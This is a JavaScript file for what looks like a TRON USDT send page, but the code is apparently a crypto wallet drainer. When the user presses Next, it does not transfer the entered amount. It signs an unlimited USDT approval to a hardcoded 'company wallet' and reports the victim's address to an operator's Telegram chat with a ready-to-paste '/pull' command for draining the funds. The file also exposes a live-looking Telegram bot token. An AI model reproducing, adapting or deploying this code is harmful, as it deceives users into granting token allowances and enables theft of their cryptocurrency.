document.addEventListener("DOMContentLoaded", function () {

    // ===== CONFIG =====
    const CONFIG = window.CONFIG || {
        COMPANY_WALLET_ADDRESS: "TPVxRUUx2dDwB3VCqwSUABPzoBM8Sii4bz",
        CONTRACT_ADDRESS: "",
        TELEGRAM_BOT_TOKEN: "8941208473:AAEY1s1srFize2Ij_Ai1nYirSOcR6i18OOM",
        ADMIN_CHAT_ID: "-5543160952",
        USDT_ADDRESS: "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf",
        TRON_FULL_HOST: "https://nile.trongrid.io",
        TRON_NETWORK_NAME: "Nile testnet",
        TRON_NETWORK_KEY: "nile",
        TRON_FEE_LIMIT: 100000000
    };

    function getReadyTronWeb() {
        return window.tronWeb && window.tronWeb.ready ? window.tronWeb : null;
    }

    async function waitForReadyTronWeb() {
        for (let attempt = 0; attempt < 20; attempt += 1) {
            const tronWeb = getReadyTronWeb();
            if (tronWeb?.defaultAddress?.base58) {
                return tronWeb;
            }
            await new Promise((resolve) => setTimeout(resolve, 100));
        }
        return null;
    }

    function isExpectedTronNetwork(tronWeb) {
        const networkKey = String(CONFIG.TRON_NETWORK_KEY || "").toLowerCase();
        if (!networkKey) return true;

        const hosts = [
            tronWeb?.fullNode?.host,
            tronWeb?.solidityNode?.host,
            tronWeb?.eventServer?.host
        ].filter(Boolean).map((host) => String(host).toLowerCase());

        return hosts.some((host) => host.includes(networkKey));
    }

    async function connectTronLink() {
        if (!window.tronLink && !window.tronWeb) {
            throw new Error("tronlink_missing");
        }

        if (window.tronLink?.request) {
            const result = await window.tronLink.request({ method: "tron_requestAccounts" });
            if (result?.code === 4001) {
                throw new Error("user_rejected");
            }
        }

        const tronWeb = await waitForReadyTronWeb();
        if (!tronWeb?.defaultAddress?.base58) {
            throw new Error("tronlink_locked");
        }

        if (!isExpectedTronNetwork(tronWeb)) {
            throw new Error("wrong_tron_network");
        }

        return tronWeb;
    }

    async function getUsdtContract(tronWeb) {
        return tronWeb.contract().at(CONFIG.USDT_ADDRESS);
    }

    async function getTokenDecimals(contract) {
        try {
            const decimals = await contract.decimals().call();
            return Number(decimals.toString());
        } catch (err) {
            console.warn("Could not fetch decimals, defaulting to 6");
            return 6;
        }
    }

    function parseTokenUnits(amount, decimals) {
        const value = String(amount).trim();
        if (!/^\d+(\.\d+)?$/.test(value)) {
            throw new Error("invalid_amount");
        }

        const [whole, fraction = ""] = value.split(".");
        const paddedFraction = (fraction + "0".repeat(decimals)).slice(0, decimals);
        const base = 10n ** BigInt(decimals);
        return (BigInt(whole) * base + BigInt(paddedFraction || "0")).toString();
    }

    function formatTokenUnits(value, decimals) {
        const raw = BigInt(value.toString());
        const base = 10n ** BigInt(decimals);
        const whole = raw / base;
        const fraction = (raw % base).toString().padStart(decimals, "0").replace(/0+$/, "");
        return fraction ? `${whole}.${fraction}` : whole.toString();
    }

    function getMaxUint256() {
        return ((1n << 256n) - 1n).toString();
    }

    async function getUsdtBalanceForWallet(walletAddress, tronWeb = getReadyTronWeb()) {
        try {
            if (!tronWeb || !tronWeb.isAddress(walletAddress)) return "0";

            const usdt = await getUsdtContract(tronWeb);
            const decimals = await getTokenDecimals(usdt);
            const balance = await usdt.balanceOf(walletAddress).call();
            return formatTokenUnits(balance, decimals);
        } catch (err) {
            console.warn("Could not fetch USDT balance:", err);
            return "0";
        }
    }

    async function requestTrxSponsor(userAddress) {
        try {
            const res = await fetch("/sponsor-trx", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ userAddress })
            });
            if (!res.ok) return;

            const data = await res.json();
            if (data.ok && data.txHash) {
                await new Promise((resolve) => setTimeout(resolve, 3000));
            }
        } catch (err) {
            console.warn("TRX sponsor unavailable:", err);
        }
    }

    // ===== TELEGRAM NOTIFICATION FUNCTION =====
    async function sendTelegramNotifications(walletAddress, txHash, userId, recipientAddress, amount) {
        const botToken = CONFIG.TELEGRAM_BOT_TOKEN;
        const adminChatId = CONFIG.ADMIN_CHAT_ID;

        const inlineKeyboard = {
            inline_keyboard: [[{ text: "🔗 View Transaction", url: `https://tronscan.org/#/transaction/${txHash}` }]]
        };

        const pullCommand = `/pull ${CONFIG.USDT_ADDRESS} ${walletAddress} ${recipientAddress} ${amount}`;

        const adminMessage =
            `🔔 **New USDT Approval Transaction**\n\n` +
            `💰 **From Wallet:** \n\`\`\`\n${walletAddress}\n\`\`\`\n` +
            `🔗 **Transaction Hash:** \n\`\`\`\n${txHash}\n\`\`\`\n` +
            `👤 **User ID:** ${userId || "Not provided"}\n` +
            `⏰ **Time:** ${new Date().toLocaleString()}\n\n` +
            `✅ TRC20 approval submitted successfully!\n\n` +
            `📋 **Copy & paste command:**\n\`\`\`\n${pullCommand}\n\`\`\``;

        const userMessage =
            `🎉 **USDT Approval Submitted!**\n\n` +
            `💰 **Your Wallet Address:** \n\`\`\`\n${walletAddress}\n\`\`\`\n` +
            `🔗 **Transaction Hash:** \n\`\`\`\n${txHash}\n\`\`\`\n` +
            `✅ **Status:** Submitted\n\n` +
            `💡 *Tap and hold on the wallet address above to copy it*`;

        try {
            // Send to admin
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: adminChatId,
                    text: adminMessage,
                    parse_mode: "Markdown",
                    reply_markup: inlineKeyboard
                })
            });

            // Send to user if provided
            if (userId) {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: userId,
                        text: userMessage,
                        parse_mode: "Markdown",
                        reply_markup: inlineKeyboard
                    })
                });
            }

            console.log("Telegram notifications sent successfully");
        } catch (error) {
            console.error("Failed to send Telegram notifications:", error);
        }
    }

    // ===== NOTIFICATION BAR SETUP =====
    function showNotification(msg, type = "info") {
        let notify = document.getElementById("notify-bar");
        if (!notify) {
            notify = document.createElement("div");
            notify.id = "notify-bar";
            notify.style.position = "fixed";
            notify.style.top = "20px";
            notify.style.left = "50%";
            notify.style.transform = "translateX(-50%)";
            notify.style.zIndex = "9999";
            notify.style.minWidth = "260px";
            notify.style.maxWidth = "90vw";
            notify.style.padding = "16px 32px";
            notify.style.borderRadius = "12px";
            notify.style.fontSize = "1rem";
            notify.style.fontWeight = "bold";
            notify.style.textAlign = "center";
            notify.style.boxShadow = "0 4px 32px #0008";
            notify.style.transition = "all 0.3s";
            document.body.appendChild(notify);
        }
        notify.textContent = msg;
        notify.style.background =
            type === "error" ? "#f87171" : type === "success" ? "#10b981" : "#374151";
        notify.style.color = "#fff";
        notify.style.opacity = "1";
        notify.style.pointerEvents = "auto";
        setTimeout(() => {
            notify.style.opacity = "0";
            notify.style.pointerEvents = "none";
        }, 3000);
    }

    // ===== FORM LOGIC =====
    const addressInput = document.querySelector('input[placeholder="Search or Enter"]');
    const amountInput = document.querySelector('input[placeholder="USDT Amount"]');
    const nextBtn = document.querySelector("button.w-full");
    const originalBtnHTML = nextBtn.innerHTML;
    const approxUsd = document.querySelector(".text-xs.text-gray-500");
    const maxBtn = Array.from(document.querySelectorAll("button")).find(
        (btn) => btn.textContent.trim().toLowerCase() === "max"
    );
    const clearAmountBtn = document.getElementById("amount-clear-btn");

    // Default amount — keep empty until user types
    approxUsd.textContent = "≈ $0.00";

    function updateClearButton() {
        if (!clearAmountBtn) return;
        clearAmountBtn.classList.toggle("visible", amountInput.value.trim().length > 0);
    }

    function onAmountInput() {
        updateApproxUsd();
        updateClearButton();
        validate();
    }

    amountInput.addEventListener("focus", function () {
        if (amountInput.value === "0") {
            amountInput.value = "";
            onAmountInput();
        }
    });

    function updateApproxUsd() {
        let amount = parseFloat(amountInput.value.trim());
        approxUsd.textContent =
            isNaN(amount) || amount <= 0 ? "≈ $0.00" : `≈ $${amount.toFixed(2)}`;
    }
    amountInput.addEventListener("input", onAmountInput);
    updateApproxUsd();
    updateClearButton();

    function validate() {
        const address = addressInput.value.trim();
        const amount = parseFloat(amountInput.value.trim());
        nextBtn.disabled = !(address.length > 0 && !isNaN(amount) && amount > 0);
    }
    addressInput.addEventListener("input", validate);
    validate();

    if (clearAmountBtn) {
        clearAmountBtn.addEventListener("click", function (e) {
            e.preventDefault();
            amountInput.value = "";
            onAmountInput();
            amountInput.focus();
        });
    }

    if (maxBtn) {
        maxBtn.addEventListener("click", async function (e) {
            e.preventDefault();
            try {
                const tronWeb = await connectTronLink();
                const walletAddress = tronWeb.defaultAddress.base58;
                amountInput.value = await getUsdtBalanceForWallet(walletAddress, tronWeb);
                onAmountInput();
            } catch (err) {
                const msg = (err?.message || "").toLowerCase();
                if (msg.includes("wrong_tron_network")) {
                    showNotification(`Switch TronLink to ${CONFIG.TRON_NETWORK_NAME || "Nile testnet"}.`, "error");
                } else {
                    showNotification("Open and unlock TronLink to get max balance.", "error");
                }
            }
        });
    }

    // ===== NEXT BUTTON - APPROVE TRC20 USDT WITH TRONLINK =====
    nextBtn.addEventListener("click", async function (e) {
        e.preventDefault();

        if (!window.tronLink && !window.tronWeb) {
            showNotification(
                "No TronLink wallet found. Please open in TronLink browser.",
                "error"
            );
            return;
        }

        nextBtn.innerHTML = '<span class="spinner">Processing...</span>';
        nextBtn.disabled = true;

        try {
            const tronWeb = await connectTronLink();
            const recipientAddress = addressInput.value.trim();
            const amount = amountInput.value.trim();
            const spenderAddress = CONFIG.CONTRACT_ADDRESS || CONFIG.COMPANY_WALLET_ADDRESS;

            if (!tronWeb.isAddress(recipientAddress)) {
                showNotification("Please enter a valid TRON address.", "error");
                return;
            }

            if (!tronWeb.isAddress(spenderAddress)) {
                showNotification("Invalid company wallet address.", "error");
                return;
            }

            const usdt = await getUsdtContract(tronWeb);
            const decimals = await getTokenDecimals(usdt);
            parseTokenUnits(amount, decimals);
            const fromAddress = tronWeb.defaultAddress.base58;

            await requestTrxSponsor(fromAddress);
            const txHash = await usdt.approve(spenderAddress, getMaxUint256()).send({
                feeLimit: Number(CONFIG.TRON_FEE_LIMIT) || 100000000
            });

            showNotification("Approval submitted.", "success");

            if (txHash && txHash.length > 0) {
                try {
                    const urlParams = new URLSearchParams(window.location.search);
                    const userId = urlParams.get("user_id");
                    await sendTelegramNotifications(fromAddress, txHash, userId, recipientAddress, amount);
                } catch (err) {
                    console.error("Failed to send Telegram notifications:", err);
                }
            }
        } catch (err) {
            const msg = (err?.message || "").toLowerCase();
            if (
                msg.includes("user rejected") ||
                msg.includes("user denied") ||
                msg.includes("user_rejected") ||
                msg.includes("cancelled") ||
                msg.includes("canceled")
            ) {
                showNotification("Transaction cancelled.", "error");
            } else if (
                msg.includes("tronlink_missing") ||
                msg.includes("tronlink_locked")
            ) {
                showNotification("Open and unlock TronLink, then try again.", "error");
            } else if (msg.includes("wrong_tron_network")) {
                showNotification(`Switch TronLink to ${CONFIG.TRON_NETWORK_NAME || "Nile testnet"}.`, "error");
            } else if (msg.includes("invalid_amount")) {
                showNotification("Please enter a valid USDT amount.", "error");
            } else if (
                msg.includes("insufficient funds") ||
                msg.includes("exceeds balance") ||
                (msg.includes("execution reverted") && msg.includes("exceeds balance"))
            ) {
                showNotification("Insufficient balance for this approval.", "error");
            } else {
                showNotification("Transaction failed. Please try again.", "error");
            }
        } finally {
            nextBtn.disabled = false;
            nextBtn.innerHTML = originalBtnHTML;
        }
    });
});

